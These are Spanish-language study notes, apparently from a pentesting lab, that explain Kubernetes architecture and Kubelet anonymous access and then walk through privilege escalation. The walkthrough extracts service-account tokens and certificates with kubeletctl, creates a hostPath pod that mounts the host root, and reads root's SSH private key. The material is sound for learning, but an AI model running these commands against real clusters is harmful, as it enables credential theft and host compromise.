[Kubernetes](https://kubernetes.io/) o K8s fue diseñado para facilitar el despliegue, escalado y gestion de contenedores de aplicaciones

Una de las características clave de Kubernetes es su adaptabilidad y compatibilidad con diversos entornos

Kubernetes es un sistema de orquestación de contenedores, que funciona ejecutando todas las aplicaciones en contenedores aislados del sistema anfitrión a través de `múltiples capas de protección`. Este enfoque asegura que las aplicaciones no se vean afectadas por cambios en el sistema anfitrión

## Concepto de K8s

Kubernetes gira en torno al concepto de pods, que pueden contener uno o más contenedores estrechamente conectados. Cada pod funciona como una máquina virtual separada en un nodo, con su propia IP, nombre de host y otros detalles

La arquitectura de Kubernetes se divide principalmente en dos tipos de componentes:

- El plano de control (nodo maestro): responsable de controlar el clúster de Kubernetes
- Nodos trabajadores (minions): donde se ejecutan las aplicaciones contenerizadas


#### Nodos

El nodo maestro aloja el `Plano de Control` de Kubernetes, que gestiona y coordina todas las actividades dentro del clúster y también asegura que se mantenga el estado deseado del clúster

Los `Minions` ejecutan las aplicaciones reales y reciben instrucciones del Plano de Control

#### Plano de control

Sirve como la capa de gestión. Consta de varios componentes cruciales:

![[Pasted image 20260921095807.png]]


	Estos elementos permiten que el `Plano de Control` tome decisiones y proporcione una vista completa de todo el clúster.


#### Minions

Sirven como la ubicación designada para ejecutar aplicaciones. Cada nodo es gestionado y regulado por el Plano de Control

El `Scheduler`, basándose en el `API server`, entiende el estado del clúster y programa nuevos pods en los nodos en consecuencia. Después de decidir en qué nodo debe ejecutarse un pod, el servidor de la API actualiza el `etcd`


## API de Kubernetes

El núcleo de la arquitectura de Kubernetes es su API, que sirve como el principal punto de contacto para todas las interacciones internas y externas

El kube-apiserver es responsable de alojar la API, que maneja y verifica las peticiones RESTful para modificar el estado del sistema. Estas peticiones pueden implicar la creación, modificación, eliminación y recuperación de información relacionada con diversos recursos dentro del sistema

#### Autenticacion

Kubernetes admite varios métodos como certificados de cliente, tokens de portador (bearer tokens), un proxy de autenticación o autenticación básica HTTP

Una vez que el usuario ha sido autenticado, Kubernetes aplica decisiones de autorización utilizando el Control de Acceso Basado en Roles (`RBAC`). Esta técnica implica asignar roles específicos a usuarios o procesos con los permisos correspondientes

El `Kubelet` puede ser configurado para permitir `acceso anónimo`. Por defecto, el Kubelet permite el acceso anónimo. Las peticiones anónimas se consideran no autenticadas, lo que implica que cualquier petición realizada al Kubelet sin un certificado de cliente válido será tratada como anónima. Esto puede ser problemático, ya que cualquier proceso o usuario que pueda alcanzar la API del Kubelet puede realizar peticiones y recibir respuestas, exponiendo potencialmente información

## Escalada de privs


Para obtener mayores privilegios y acceder al sistema anfitrión, podemos utilizar una herramienta llamada [kubeletctl](https://github.com/cyberark/kubeletctl) para obtener el `token` y el `certificado` (`ca.crt`)

- Kubelet API - Extrayendo Tokens

```
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```
![[Pasted image 20260921101935.png]]

- Kubelet API - Extrayendo Certificados

```
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```
![[Pasted image 20260921101957.png]]

Ahora que tenemos tanto el `token` como el `certificado`, podemos verificar los derechos de acceso en el clúster de Kubernetes. Esto se usa comúnmente para auditoría y verificación para garantizar que los usuarios tengan el nivel correcto de acceso

 Podemos usarlo para nuestros propósitos y podemos preguntar a K8s si tenemos permiso para realizar diferentes acciones en varios recursos

- Listar Privilegios

```
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```
![[Pasted image 20260921102114.png]]

Además de los recursos selfsubject, podemos hacer `get`, `create` y `list` de pods. A partir de aquí, podemos crear un archivo `YAML` que podemos usar para crear un nuevo contenedor y montar todo el sistema de archivos raíz del sistema anfitrión en el directorio `/root` de este contenedor. Desde allí, podríamos acceder a los archivos y directorios de los sistemas anfitriones

- Pod YAML

```
apiVersion: v1 
kind: Pod 
metadata: 
	name: privesc 
	namespace: default 
spec: 
	containers: 
	- name: privesc 
	  image: nginx:1.14.2 
	  volumeMounts: 
	  - mountPath: /root 
	    name: mount-root-into-mnt 
	volumes: 
	- name: mount-root-into-mnt 
	  hostPath: 
		  path: / 
  automountServiceAccountToken: true 
  hostNetwork: true
```
![[Pasted image 20260921102406.png]]

Una vez creado, ahora podemos crear el nuevo pod y verificar si se está ejecutando como se esperaba

- Creando un nuevo Pod

```
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
```
![[Pasted image 20260921102437.png]]

Si el pod se está ejecutando, podemos ejecutar el comando y podríamos generar una shell inversa (reverse shell) o recuperar datos sensibles como la clave SSH privada del usuario root

- Extrayendo la Clave SSH de Root

```
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
